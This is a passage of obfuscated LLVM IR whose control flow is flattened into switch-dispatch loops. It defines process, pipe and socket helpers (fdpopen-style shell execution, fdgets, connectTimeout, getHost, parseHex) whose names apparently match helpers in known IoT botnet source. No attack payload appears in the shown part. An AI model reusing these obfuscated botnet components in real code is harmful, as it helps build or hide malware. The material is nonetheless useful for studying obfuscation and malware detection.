  %31 = call i32 @pipe(i32* %30) #2
  %32 = icmp slt i32 %31, 0
  %33 = select i1 %32, i32 1699645429, i32 -1653208788
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i32 -1, i32* %3, align 4
  store i32 1976675634, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32*, i32** @fdopen_pids, align 8
  %37 = icmp eq i32* %36, null
  %38 = select i1 %37, i32 990152016, i32 270486543
  store i32 %38, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = call i32 @getdtablesize() #2
  store i32 %40, i32* %8, align 4
  %41 = icmp sle i32 %40, 0
  %42 = select i1 %41, i32 -1213468266, i32 1480491155
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  store i32 -1, i32* %3, align 4
  store i32 1976675634, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i32, i32* %8, align 4
  %46 = sext i32 %45 to i64
  %47 = mul i64 %46, 4
  %48 = trunc i64 %47 to i32
  %49 = zext i32 %48 to i64
  %50 = call noalias i8* @malloc(i64 %49) #2
  %51 = bitcast i8* %50 to i32*
  store i32* %51, i32** @fdopen_pids, align 8
  %52 = icmp eq i32* %51, null
  %53 = select i1 %52, i32 -1688564705, i32 499534579
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  store i32 -1, i32* %3, align 4
  store i32 1976675634, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = load i32*, i32** @fdopen_pids, align 8
  %57 = bitcast i32* %56 to i8*
  %58 = load i32, i32* %8, align 4
  %59 = sext i32 %58 to i64
  %60 = mul i64 %59, 4
  call void @llvm.memset.p0i8.i64(i8* %57, i8 0, i64 %60, i32 1, i1 false)
  store i32 270486543, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = call i32 @vfork() #11
  store i32 %62, i32* %.reg2mem4
  %.reload8 = load volatile i32, i32* %.reg2mem4
  store i32 %.reload8, i32* %9, align 4
  store i32 1100368071, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload7 = load volatile i32, i32* %.reg2mem4
  %Pivot = icmp slt i32 %.reload7, 0
  %63 = select i1 %Pivot, i32 -614577492, i32 475941305
  store i32 %63, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload5 = load volatile i32, i32* %.reg2mem4
  %SwitchLeaf2 = icmp eq i32 %.reload5, 0
  %64 = select i1 %SwitchLeaf2, i32 158050119, i32 -1899432781
  store i32 %64, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload6 = load volatile i32, i32* %.reg2mem4
  %SwitchLeaf = icmp eq i32 %.reload6, -1
  %65 = select i1 %SwitchLeaf, i32 -420756667, i32 -1899432781
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %68 = load i32, i32* %67, align 4
  %69 = call i32 @close(i32 %68)
  %70 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %71 = load i32, i32* %70, align 4
  %72 = call i32 @close(i32 %71)
  store i32 -1, i32* %3, align 4
  store i32 1976675634, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = load i8*, i8** %5, align 8
  %75 = load i8, i8* %74, align 1
  %76 = zext i8 %75 to i32
  %77 = icmp eq i32 %76, 114
  %78 = select i1 %77, i32 -135845205, i32 -2094960697
  store i32 %78, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %81 = load i32, i32* %80, align 4
  %82 = icmp ne i32 %81, 1
  %83 = select i1 %82, i32 -1216727157, i32 -201203721
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %86 = load i32, i32* %85, align 4
  %87 = call i32 @dup2(i32 %86, i32 1) #2
  %88 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %89 = load i32, i32* %88, align 4
  %90 = call i32 @close(i32 %89)
  store i32 -201203721, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %93 = load i32, i32* %92, align 4
  %94 = call i32 @close(i32 %93)
  store i32 -1797990437, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  %96 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %97 = load i32, i32* %96, align 4
  %98 = icmp ne i32 %97, 0
  %99 = select i1 %98, i32 -1371106369, i32 2121226371
  store i32 %99, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  %101 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %102 = load i32, i32* %101, align 4
  %103 = call i32 @dup2(i32 %102, i32 0) #2
  %104 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %105 = load i32, i32* %104, align 4
  %106 = call i32 @close(i32 %105)
  store i32 2121226371, i32* %switchVar
  br label %loopEnd

; <label>:107:                                    ; preds = %loopEntry
  %108 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %109 = load i32, i32* %108, align 4
  %110 = call i32 @close(i32 %109)
  store i32 -1797990437, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  %112 = load i8*, i8** %4, align 8
  %113 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i32 0, i32 0), i8* %112, i8* null) #2
  call void @_exit(i32 127) #12
  unreachable

NewDefault:                                       ; preds = %loopEntry
  store i32 1835496631, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = load i8*, i8** %5, align 8
  %116 = load i8, i8* %115, align 1
  %117 = zext i8 %116 to i32
  %118 = icmp eq i32 %117, 114
  %119 = select i1 %118, i32 425136638, i32 -520679009
  store i32 %119, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %122 = load i32, i32* %121, align 4
  store i32 %122, i32* %6, align 4
  %123 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %124 = load i32, i32* %123, align 4
  %125 = call i32 @close(i32 %124)
  store i32 1072718024, i32* %switchVar
  br label %loopEnd

; <label>:126:                                    ; preds = %loopEntry
  %127 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %128 = load i32, i32* %127, align 4
  store i32 %128, i32* %6, align 4
  %129 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %130 = load i32, i32* %129, align 4
  %131 = call i32 @close(i32 %130)
  store i32 1072718024, i32* %switchVar
  br label %loopEnd

; <label>:132:                                    ; preds = %loopEntry
  %133 = load i32, i32* %9, align 4
  %134 = load i32*, i32** @fdopen_pids, align 8
  %135 = load i32, i32* %6, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds i32, i32* %134, i64 %136
  store i32 %133, i32* %137, align 4
  %138 = load i32, i32* %6, align 4
  store i32 %138, i32* %3, align 4
  store i32 1976675634, i32* %switchVar
  br label %loopEnd

; <label>:139:                                    ; preds = %loopEntry
  %140 = load i32, i32* %3, align 4
  ret i32 %140

loopEnd:                                          ; preds = %132, %126, %120, %114, %NewDefault, %107, %100, %95, %91, %84, %79, %73, %66, %LeafBlock, %LeafBlock1, %NodeBlock, %61, %55, %54, %44, %43, %39, %35, %34, %29, %28, %21, %15, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) #4

; Function Attrs: nounwind
declare i32 @getdtablesize() #4

; Function Attrs: nounwind returns_twice
declare i32 @vfork() #6

declare i32 @close(i32) #3

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) #4

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) #4

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) #0 {
  %.reg2mem = alloca i32*
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.in_addr, align 4
  store i32 %0, i32* %3, align 4
  %10 = load i32*, i32** @fdopen_pids, align 8
  store i32* %10, i32** %.reg2mem
  %switchVar = alloca i32
  store i32 -1577296609, i32* %switchVar
  %.reg2mem2 = alloca i1
  %.reg2mem4 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1577296609, label %first
    i32 1722500256, label %13
    i32 2121043842, label %21
    i32 -440687515, label %22
    i32 -1999933344, label %30
    i32 1190507962, label %37
    i32 -1179534339, label %41
    i32 1923834186, label %45
    i32 -1339206663, label %47
    i32 1033082237, label %56
    i32 2075583398, label %57
    i32 428531936, label %64
    i32 -266863772, label %65
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32*, i32** %.reg2mem
  %11 = icmp eq i32* %.reload, null
  %12 = select i1 %11, i32 2121043842, i32 1722500256
  store i32 %12, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load i32*, i32** @fdopen_pids, align 8
  %15 = load i32, i32* %3, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds i32, i32* %14, i64 %16
  %18 = load i32, i32* %17, align 4
  %19 = icmp eq i32 %18, 0
  %20 = select i1 %19, i32 2121043842, i32 -440687515
  store i32 %20, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  store i32 -1, i32* %2, align 4
  store i32 -266863772, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  %23 = load i32, i32* %3, align 4
  %24 = call i32 @close(i32 %23)
  %25 = call i32 @sigemptyset(%struct.__sigset_t* %6) #2
  %26 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 2) #2
  %27 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 3) #2
  %28 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 1) #2
  %29 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %6, %struct.__sigset_t* %5) #2
  store i32 -1999933344, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load i32*, i32** @fdopen_pids, align 8
  %32 = load i32, i32* %3, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds i32, i32* %31, i64 %33
  %35 = load i32, i32* %34, align 4
  %36 = call i32 @waitpid(i32 %35, i32* %7, i32 0)
  store i32 %36, i32* %8, align 4
  store i32 1190507962, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i32, i32* %8, align 4
  %39 = icmp eq i32 %38, -1
  %40 = select i1 %39, i32 -1179534339, i32 1923834186
  store i32 %40, i32* %switchVar
  store i1 false, i1* %.reg2mem2
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %42 = call i32* @__errno_location() #13
  %43 = load i32, i32* %42, align 4
  %44 = icmp eq i32 %43, 4
  store i32 1923834186, i32* %switchVar
  store i1 %44, i1* %.reg2mem2
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %46 = select i1 %.reload3, i32 -1999933344, i32 -1339206663
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %5, %struct.__sigset_t* null) #2
  %49 = load i32*, i32** @fdopen_pids, align 8
  %50 = load i32, i32* %4, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds i32, i32* %49, i64 %51
  store i32 0, i32* %52, align 4
  %53 = load i32, i32* %8, align 4
  %54 = icmp eq i32 %53, -1
  %55 = select i1 %54, i32 1033082237, i32 2075583398
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  store i32 428531936, i32* %switchVar
  store i32 -1, i32* %.reg2mem4
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = bitcast %struct.in_addr* %9 to i32*
  %59 = load i32, i32* %7, align 4
  store i32 %59, i32* %58, align 4
  %60 = bitcast %struct.in_addr* %9 to i32*
  %61 = load i32, i32* %60, align 4
  %62 = and i32 %61, 65280
  %63 = ashr i32 %62, 8
  store i32 428531936, i32* %switchVar
  store i32 %63, i32* %.reg2mem4
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %.reload5 = load i32, i32* %.reg2mem4
  store i32 %.reload5, i32* %2, align 4
  store i32 -266863772, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i32, i32* %2, align 4
  ret i32 %66

loopEnd:                                          ; preds = %64, %57, %56, %47, %45, %41, %37, %30, %22, %21, %13, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #4

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #4

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #4

declare i32 @waitpid(i32, i32*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #8

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  %switchVar = alloca i32
  store i32 -1087534951, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i8*
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1087534951, label %9
    i32 1208071287, label %13
    i32 785954850, label %18
    i32 -1755956913, label %27
    i32 -1715530952, label %29
    i32 1944274953, label %39
    i32 483577667, label %43
    i32 -1108389919, label %44
    i32 1133336804, label %46
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %7, align 4
  %11 = icmp eq i32 %10, 1
  %12 = select i1 %11, i32 1208071287, i32 -1755956913
  store i32 %12, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load i32, i32* %8, align 4
  %15 = load i32, i32* %5, align 4
  %16 = icmp slt i32 %14, %15
  %17 = select i1 %16, i32 785954850, i32 -1755956913
  store i32 %17, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %4, align 8
  %20 = load i32, i32* %8, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  %23 = getelementptr inbounds i8, i8* %22, i64 -1
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp ne i32 %25, 10
  store i32 -1755956913, i32* %switchVar
  store i1 %26, i1* %.reg2mem
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %28 = select i1 %.reload, i32 -1715530952, i32 1944274953
  store i32 %28, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i32, i32* %6, align 4
  %31 = load i8*, i8** %4, align 8
  %32 = load i32, i32* %8, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds i8, i8* %31, i64 %33
  %35 = call i64 @read(i32 %30, i8* %34, i64 1)
  %36 = trunc i64 %35 to i32
  store i32 %36, i32* %7, align 4
  %37 = load i32, i32* %8, align 4
  %38 = add nsw i32 %37, 1
  store i32 %38, i32* %8, align 4
  store i32 -1087534951, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %7, align 4
  %41 = icmp eq i32 %40, 0
  %42 = select i1 %41, i32 483577667, i32 -1108389919
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  store i32 1133336804, i32* %switchVar
  store i8* null, i8** %.reg2mem2
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i8*, i8** %4, align 8
  store i32 1133336804, i32* %switchVar
  store i8* %45, i8** %.reg2mem2
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %.reload3 = load i8*, i8** %.reg2mem2
  ret i8* %.reload3

loopEnd:                                          ; preds = %44, %43, %39, %29, %27, %18, %13, %9, %switchDefault
  br label %loopEntry
}

declare i64 @read(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #13
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  store i32 %34, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -356865248, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -356865248, label %first
    i32 -2091219582, label %37
    i32 60951671, label %38
    i32 -647512437, label %47
    i32 1207656712, label %52
    i32 -1175365774, label %57
    i32 -1350265559, label %66
    i32 1474722079, label %83
    i32 -1259567029, label %90
    i32 -1625893236, label %91
    i32 -188207273, label %92
    i32 -140885957, label %93
    i32 -933152950, label %94
    i32 -804687672, label %95
    i32 -860753011, label %96
    i32 -936529066, label %105
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %35 = icmp ne i32 %.reload, 0
  %36 = select i1 %35, i32 -2091219582, i32 60951671
  store i32 %36, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -936529066, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %40 = getelementptr inbounds [8 x i8], [8 x i8]* %39, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %40, i8 0, i64 8, i32 4, i1 false)
  %41 = load i32, i32* %6, align 4
  %42 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %43 = call i32 @connect(i32 %41, %struct.sockaddr* %42, i32 16)
  store i32 %43, i32* %16, align 4
  %44 = load i32, i32* %16, align 4
  %45 = icmp slt i32 %44, 0
  %46 = select i1 %45, i32 -647512437, i32 -860753011
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = call i32* @__errno_location() #13
  %49 = load i32, i32* %48, align 4
  %50 = icmp eq i32 %49, 115
  %51 = select i1 %50, i32 1207656712, i32 -933152950
  store i32 %51, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %9, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %54, i64* %55, align 8
  %56 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %56, align 8
  store i32 -1175365774, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %59 = getelementptr inbounds [16 x i64], [16 x i64]* %58, i64 0, i64 0
  %60 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %59) #2, !srcloc !1
  %61 = extractvalue { i64, i64* } %60, 0
  %62 = extractvalue { i64, i64* } %60, 1
  %63 = trunc i64 %61 to i32
  store i32 %63, i32* %17, align 4
  %64 = ptrtoint i64* %62 to i64
  %65 = trunc i64 %64 to i32
  store i32 %65, i32* %18, align 4
  store i32 -1350265559, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* %6, align 4
  %68 = srem i32 %67, 64
  %69 = zext i32 %68 to i64
  %70 = shl i64 1, %69
  %71 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %72 = load i32, i32* %6, align 4
  %73 = sdiv i32 %72, 64
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds [16 x i64], [16 x i64]* %71, i64 0, i64 %74
  %76 = load i64, i64* %75, align 8
  %77 = or i64 %76, %70
  store i64 %77, i64* %75, align 8
  %78 = load i32, i32* %6, align 4
  %79 = add nsw i32 %78, 1
  %80 = call i32 @select(i32 %79, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  %81 = icmp sgt i32 %80, 0
  %82 = select i1 %81, i32 1474722079, i32 -188207273
  store i32 %82, i32* %switchVar
  br label %loopEnd

; <label>:83:                                     ; preds = %loopEntry
  store i32 4, i32* %13, align 4
  %84 = load i32, i32* %6, align 4
  %85 = bitcast i32* %14 to i8*
  %86 = call i32 @getsockopt(i32 %84, i32 1, i32 4, i8* %85, i32* %13) #2
  %87 = load i32, i32* %14, align 4
  %88 = icmp ne i32 %87, 0
  %89 = select i1 %88, i32 -1259567029, i32 -1625893236
  store i32 %89, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -936529066, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  store i32 -140885957, i32* %switchVar
  br label %loopEnd

; <label>:92:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -936529066, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  store i32 -804687672, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -936529066, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  store i32 -860753011, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = load i32, i32* %6, align 4
  %98 = call i32 (i32, i32, ...) @fcntl(i32 %97, i32 3, i8* null)
  %99 = sext i32 %98 to i64
  store i64 %99, i64* %15, align 8
  %100 = load i64, i64* %15, align 8
  %101 = and i64 %100, -2049
  store i64 %101, i64* %15, align 8
  %102 = load i32, i32* %6, align 4
  %103 = load i64, i64* %15, align 8
  %104 = call i32 (i32, i32, ...) @fcntl(i32 %102, i32 4, i64 %103)
  store i32 1, i32* %5, align 4
  store i32 -936529066, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %106 = load i32, i32* %5, align 4
  ret i32 %106

loopEnd:                                          ; preds = %96, %95, %94, %93, %92, %91, %90, %83, %66, %57, %52, %47, %38, %37, %first, %switchDefault
  br label %loopEntry
}

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #8

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #2
  store i32 %8, i32* %.reg2mem
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 -453521744, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -453521744, label %first
    i32 -1644235910, label %13
    i32 -1600893859, label %14
    i32 1346349000, label %15
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %11 = icmp eq i32 %.reload, -1
  %12 = select i1 %11, i32 -1644235910, i32 -1600893859
  store i32 %12, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  store i32 1, i32* %3, align 4
  store i32 1346349000, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 1346349000, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load i32, i32* %3, align 4
  ret i32 %16

loopEnd:                                          ; preds = %14, %13, %first, %switchDefault
  br label %loopEntry
}

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #4

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #4

; Function Attrs: noinline nounwind uwtable
define i64 @parseHex(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  store i8* %0, i8** %2, align 8
  store i64 0, i64* %3, align 8
  %switchVar = alloca i32
  store i32 -1452167491, i32* %switchVar
  %.reg2mem = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1452167491, label %4
    i32 1222430665, label %10
    i32 678336290, label %13
    i32 -1974859353, label %15
    i32 1278131553, label %25
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:4:                                      ; preds = %loopEntry
  %5 = load i8*, i8** %2, align 8
  %6 = load i8, i8* %5, align 1
  %7 = zext i8 %6 to i32
  %8 = icmp ne i32 %7, 0
  %9 = select i1 %8, i32 1222430665, i32 678336290
  store i32 %9, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i64, i64* %3, align 8
  %12 = icmp sge i64 %11, 0
  store i32 678336290, i32* %switchVar
  store i1 %12, i1* %.reg2mem
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %14 = select i1 %.reload, i32 -1974859353, i32 1278131553
  store i32 %14, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
